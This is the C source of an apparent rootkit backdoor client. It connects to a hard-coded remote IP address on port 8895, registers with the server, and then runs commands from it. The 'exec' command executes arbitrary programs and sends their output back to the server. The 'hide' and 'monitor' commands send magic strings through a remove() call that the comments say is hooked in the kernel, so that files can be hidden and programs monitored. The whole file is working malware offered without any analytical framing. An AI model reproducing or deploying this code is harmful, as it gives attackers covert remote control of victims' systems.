#include <sys/types.h>
#include <sys/socket.h>
#include <stdio.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <unistd.h>
#include <string.h>
#include <stdlib.h>
#include <fcntl.h>
#include <sys/shm.h>
#include <sys/wait.h>
#include <errno.h>

#define SP_PORT     8895
#define BUFFER_SIZE 4096
#define CMD_RESULT "cmdoutput.txttmp"
char* SERVER_ADDR = "104.194.96.169";  

int readbuf(int conn, char* buf, int size);
int readline(int conn, char* buf, int size);
int getIntFromBuf(char* buf, int offset);
int execcmd(char* cmd);
int sendresult(int socket, char* buf);
int hidefile(char* cmd);
int monitor(char* cmd);

int main(int argc,char* argv[])
{
//    daemon(1, 1);
    int sock_fd = socket(AF_INET,SOCK_STREAM, 0);
    struct sockaddr_in servaddr;
    char buf[BUFFER_SIZE];
    int filesize, chunk, rv;
    FILE *fp;    
    char *cmd;
    struct timeval timeout={1800,0};
    printf("Argc [%d]", argc);
    if(argc > 1){
        printf("Argv [%s]", argv[1]);
        SERVER_ADDR = argv[1];
    }
    
    memset(&servaddr, 0, sizeof(servaddr));
    servaddr.sin_family = AF_INET;
    servaddr.sin_port = htons(SP_PORT); 
    servaddr.sin_addr.s_addr = inet_addr(SERVER_ADDR);  
    setsockopt(sock_fd,SOL_SOCKET,SO_RCVTIMEO,(char*)&timeout,sizeof(struct timeval));
    
    if (connect(sock_fd, (struct sockaddr *)&servaddr, sizeof(servaddr)) < 0)
    {
        printf("Connection error\n");
        exit(1);
    }
    char *req = "register\n";                    // Req for obtain a rootkit
    send(sock_fd, req, strlen(req),0); 
    
    memset(buf, 0, sizeof(buf));    
    readbuf(sock_fd, buf, 3);                    // Read ACK
    if(strcmp(buf, "ACK") == 0){
        while(1){
            memset(buf, 0, sizeof(buf));
            readline(sock_fd, buf, BUFFER_SIZE);
            
            if(strcmp(buf, "close") == 0){
                break;
            } else if(strncmp(buf, "exec", 4) == 0){
                rv = execcmd(buf + 4);
                if(rv > 0){
                    sendresult(sock_fd, buf);
                }
            } else if(strncmp(buf, "hide", 4) == 0){
                hidefile(buf + 4);
            } else if(strncmp(buf, "monitor", 7) == 0){
                monitor(buf + 7);
            }
        }
    }
    
    fclose(fp);
    close(sock_fd);
    return 0;
}

int sendresult(int socket, char* buf){
    FILE *fp;
    int i = 0;
    
    fp=fopen(CMD_RESULT,"r");
    while((buf[i]=fgetc(fp)) != EOF && i < BUFFER_SIZE-1){
        i++;
    }
    fclose(fp);
    buf[i] = '\0';
    buf[i+1] = EOF;
    send(socket, buf, strlen(buf) + 1,0); 
    
    return 0;
}

int hidefile(char* cmd){
    char filen[256] = "HIDEAFILEINKERNEL%";
    while(*cmd == ' ') cmd++;
    memcpy(filen+strlen(filen), cmd, strlen(cmd) + 1);
    remove(filen);          //We hooked remove;
}

int monitor(char* cmd){
    char filen[256] = "SETMONITORPROGRAM%";
    while(*cmd == ' ') cmd++;
    memcpy(filen+strlen(filen), cmd, strlen(cmd) + 1);
    remove(filen);          //We hooked remove;
}

int execcmd(char* cmd){
    char *args[20];
    int i, j, rv;
    char *str = (char*) malloc(strlen(cmd)*sizeof(char));
    
    while(*cmd == ' ') cmd++;
    for(i=0, j=0; ; cmd++){
        if(*cmd == ' ' || *cmd == '\n'){
            str[j] = '\0';
            args[i] = str;
            printf("=%s=\n", str);
            if(*cmd == '\n'){
                args[i+1] = NULL;
                break;
            }
            str = (char*) malloc(strlen(cmd)*sizeof(char));
            i++;
            j=0;
        } else {
            str[j] = *cmd;
            j++;
        }
    }
    if(strcmp(args[0],"cd")==0){
        if(args[1] == NULL || strcmp(args[1],"~")==0 || strcmp(args[1],"")==0){
            rv = chdir("/root");
        } else {
            rv = chdir(args[1]);
        }
    } else {
        if((i=fork()) == 0){
            freopen(CMD_RESULT, "w", stdout);
            execvp(args[0], args); 
        }
        waitpid(i, &j, 0);
        rv = 1;
    }
    for(i=0; args[i] != NULL; i++){
        free(args[i]);
    }
    return rv;
}

int readbuf(int conn, char* buf, int size){
    int cur = 0;
    while(cur < size){
        int cnt = recv(conn, buf + cur, size - cur, 0);
        if(cnt > 0){
            cur += cnt;
        } 
    }
    return cur;
}

int readline(int conn, char* buf, int size){
    int cur = 0;
    while(cur < size){
        int cnt = recv(conn, buf + cur, size - cur, 0);
        if(cnt > 0){
            cur += cnt;
            if(buf[cur-1] == '\n'){
                break;
            }
        } 
    }
    return cur;
}

int getIntFromBuf(char* buf, int offset){
    int value;    
    value = (int) ( ((buf[offset] & 0xFF)<<24)  
            |((buf[offset+1] & 0xFF)<<16)  
            |((buf[offset+2] & 0xFF)<<8)  
            |(buf[offset+3] & 0xFF));  
    return value;
}